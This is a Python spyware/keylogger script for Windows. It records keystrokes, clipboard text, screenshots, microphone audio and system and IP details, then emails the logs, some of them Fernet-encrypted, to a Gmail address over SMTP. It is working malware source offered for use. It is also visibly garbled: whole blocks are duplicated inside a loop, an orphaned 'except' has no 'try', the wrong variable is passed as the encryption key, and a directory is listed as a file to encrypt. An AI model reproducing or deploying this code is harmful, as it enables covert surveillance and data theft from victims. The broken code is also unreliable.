# --- Email Imports ---
from email.mime.multipart import MIMEMultipart  # Builds a full email with body + attachments
from email.mime.text import MIMEText            # Adds plain-text message body to the email
from email.mime.base import MIMEBase            # Wraps a file to be attached
from email import encoders                      # Safely encodes the attachment for transfer
import smtplib                                  # Enables sending emails through SMTP (Gmail)

# --- System Info Imports ---
import socket                                   # Gets IP and hostname info
import platform                                 # Retrieves OS and architecture details

# --- Clipboard Access ---
import win32clipboard                           # Accesses contents copied to Windows clipboard

# --- Keyboard Listener ---
from pynput.keyboard import Key, Listener       # Logs key presses and releases

# --- Utility Imports ---
import time                                     # For delays, timestamps, scheduling
import os                                       # File paths, creation, OS-related ops

# --- Audio Recording ---
from scipy.io.wavfile import write as write_audio  # Saves audio as WAV file
import sounddevice as sd                        # Records audio from microphone

# --- Encryption ---
from cryptography.fernet import Fernet          # For encrypting/decrypting files

# --- User Info + Web Requests ---
import getpass                                  # Gets current username
from requests import get                        # Fetches IP info or any web API

# --- Screenshot Capture ---
from multiprocessing import Process, freeze_support  # Handles parallel execution (optional)
from PIL import ImageGrab                       # Captures screenshot of entire screen

# --- File Setup ---
keys_information = "key_log.txt"                # Filename where keystrokes are saved
system_information = "systeminfo.txt"           # System Information
clipboard_information = "clipboard.txt"         # Clipboard text
screenshot_information = "screenshot.png"       # Screenshot image filename
time_iteration = 15                             # Time interval between iterations
microphone_time = 10                            # Seconds of audio to record
audio_information = "audio.wav"                 # Audio log filename
sd.default.device = (2, None)                   # Optional: specify input audio device

# ⚠️ Replace these with environment variables or config file in production
email_address = "your_email@example.com"        # Sender Gmail ID (replace before use)
password = "your_app_password_here"             # App Password (never use real Gmail password)
toadd = "receiver_email@example.com"            # Recipient Gmail ID
file_path = "D:\\YourFolder\\Keylogger"         # Directory to save logs
extend = "\\"                                   # Path separator for Windows

# --- Email Sending Function ---
def send_email(filename, attachment, toadd):
    fromadd = email_address  # Sender address

    msg = MIMEMultipart()
    msg['From'] = fromadd
    msg['To'] = toadd
    msg['Subject'] = "Logarithmic"  # Email subject

    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    with open(attachment, 'rb') as file:  # Open log file in binary mode
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(file.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', f"attachment; filename={filename}")
        msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromadd, password)
    text = msg.as_string()
    s.sendmail(fromadd, toadd, text)
    s.quit()
# --- Send the log file now ---
send_email(keys_information, file_path + extend + keys_information, toadd)

# --- Function to collect system information and write to a log file ---
def computer_information():
    # Open or create the system information file
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()  # Get device hostname
        IPAddr = socket.gethostbyname(hostname)  # Get local IP address

        # Try to fetch public IP address via external service
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address\n")

        # Log hardware and OS information
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

# Execute system info logging
computer_information()

# --- Function to copy and log current clipboard content ---
def copy_clipboard():
    # Open or create clipboard log file
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()  # Access system clipboard
            pasted_data = win32clipboard.GetClipboardData()  # Get current clipboard data
            win32clipboard.CloseClipboard()  # Close clipboard access
            f.write("Clipboard Data:\n" + pasted_data + '\n')
        except:
            f.write("Clipboard could not be copied\n")  # Log if data couldn’t be accessed

# Run clipboard logger
copy_clipboard()
# --- Microphone Audio Recorder ---
def microphone():
    fs = 44100  # Sampling frequency (Hz) — standard CD quality
    seconds = microphone_time  # Duration to record (defined globally)

    try:
        print("Recording...")

        # Manually set input device; index (1, None) may vary depending on your system
        sd.default.device = (1, None)  # (input device index, output device index)

        # Begin recording in stereo (2 channels)
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)

        # Display which input device is being used
        print("Using input device:", sd.query_devices(sd.default.device[0])['name'])

        sd.wait()  # Wait until recording is finished

        # Save audio to file (WAV format)
        write_audio(file_path + extend + audio_information, fs, recording)
        print("Audio saved.")
    except Exception as e:
        print("Microphone failed:", str(e))  # Print error message if recording fails

# --- Screenshot Capture ---
def screenshot():
    try:
        im = ImageGrab.grab()  # Capture full screen
        im.save(file_path + extend + screenshot_information)  # Save image as PNG
    except Exception as e:
        print("Screenshot failed:", str(e))  # Print error message on failure

# --- Trigger a Screenshot Immediately ---
screenshot()
# --- Loop Control Variables ---
number_of_iterations = 0
number_of_iterations_end = 15  # Total number of cycles
currentTime = time.time()  # Start time
stoppingTime = time.time() + time_iteration  # Timeout control

# --- Loop Execution ---
while number_of_iterations < number_of_iterations_end:
    # --- File Imports ---
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders
    import smtplib

    import socket
    import platform
    import win32clipboard
    from pynput.keyboard import Key, Listener
    import time
    import os

    from scipy.io.wavfile import write as write_audio
    import sounddevice as sd

    from cryptography.fernet import Fernet
    import getpass
    from requests import get
    from multiprocessing import Process, freeze_support
    from PIL import ImageGrab

    # --- File Setup ---
    keys_information = "key_log.txt"
    system_information = "systeminfo.txt"
    clipboard_information = "clipboard.txt"
    keys_information_e = "e_key_log.txt"
    system_information_e = "e_systeminfo.txt"
    clipboard_information_e = "e_clipboard.txt"

    audio_information = "audio.wav"
    screenshot_information = "screenshot.png"
    time_iteration = 15
    microphone_time = 10

    # --- Sensitive Credentials (Use .env or config.py in public repos) ---
    email_address = "your_email@example.com"
    password = "your_app_password_here"
    toadd = "recipient_email@example.com"

    # --- Runtime Metadata ---
    username = getpass.getuser()
    key = "your_generated_fernet_key_here"

    # --- Path Setup ---
    file_path = "D:\\YourProjectFolder\\Keylogger"
    extend = "\\"
    file_merge = file_path + extend
  # --- Email Sending Function ---
def send_email(filename, attachment, toadd):
    fromadd = email_address  # Sets the sender email

    msg = MIMEMultipart()  # Prepares a multipart email container
    msg['From'] = fromadd  # Sender field in email
    msg['To'] = toadd      # Receiver field in email
    msg['Subject'] = "Logarithmic"  # Subject of the email

    body = "Body_of_the_mail"  # Email body content
    msg.attach(MIMEText(body, 'plain'))  # Add plain text body to the email

    attachment = open(attachment, 'rb')  # Open file to attach (read as binary)
    p = MIMEBase('application', 'octet-stream')  # Specify attachment type
    p.set_payload(attachment.read())  # Read file contents into email attachment
    encoders.encode_base64(p)  # Encode file safely for email transfer
    p.add_header('Content-Disposition', f"attachment; filename={filename}")  # Set attachment header
    msg.attach(p)  # Attach the file to the email

    s = smtplib.SMTP('smtp.gmail.com', 587)  # Gmail SMTP server + port
    s.starttls()  # Start encrypted communication
    s.login(fromadd, password)  # Login using credentials
    text = msg.as_string()  # Convert email to raw string format
    s.sendmail(fromadd, toadd, text)  # Send the email
    s.quit()  # Close the SMTP connection

# --- Send the log file now ---
send_email(keys_information, file_path + extend + keys_information, toadd)


# --- Function to collect system information and write to a log file ---
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address\n")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

# Call the function to execute system info logging
computer_information()


# --- Function to copy and log current clipboard content ---
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data:\n" + pasted_data + '\n')
        except:
            f.write("Clipboard could not be copied\n")
# --- Clipboard Logging Exception ---
except:
    # If anything fails (e.g. unsupported format), log it
    f.write("Clipboard could not be copied\n")

# --- Call Clipboard Logger ---
copy_clipboard()

# --- Microphone Recorder ---
def microphone():
    fs = 44100  # Sampling rate in Hz
    seconds = microphone_time  # Duration to record

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait for recording

    write_audio(file_path + extend + audio_information, fs, myrecording)  # Save audio

# --- Screenshot Capture ---
def screenshot():
    try:
        im = ImageGrab.grab()  # Capture screen
        im.save(file_path + extend + screenshot_information)  # Save image
    except Exception as e:
        print("Screenshot failed:", str(e))

screenshot()  # Initial screenshot

# --- Loop Setup ---
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# --- Main Logging Loop ---
while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []

    # --- Key Press Handler ---
    def on_press(key):
        global keys, count, currentTime
        print(str(key))
        keys.append(str(key))
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    # --- Write Keys to File ---
    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if "space" in k:
                    f.write("\n")
                elif "Key" not in k:
                    f.write(k)

    # --- Key Release Handler ---
    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    # --- Start Listener ---
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # --- Post-Iteration Tasks ---
    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "a") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toadd)

        copy_clipboard()
        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# --- Encrypt Files & Email ---
files_to_encrypt = [
    file_merge + system_information,
    file_merge + clipboard_information,
    file_merge
]
encrypted_file_names = [
    file_merge + system_information_e,
    file_merge + clipboard_information_e,
    file_merge + keys_information_e
]

count = 0
for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(keys)  # Encryption object
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names, toadd)
    count += 1

time.sleep(120)  # Optional cooldown
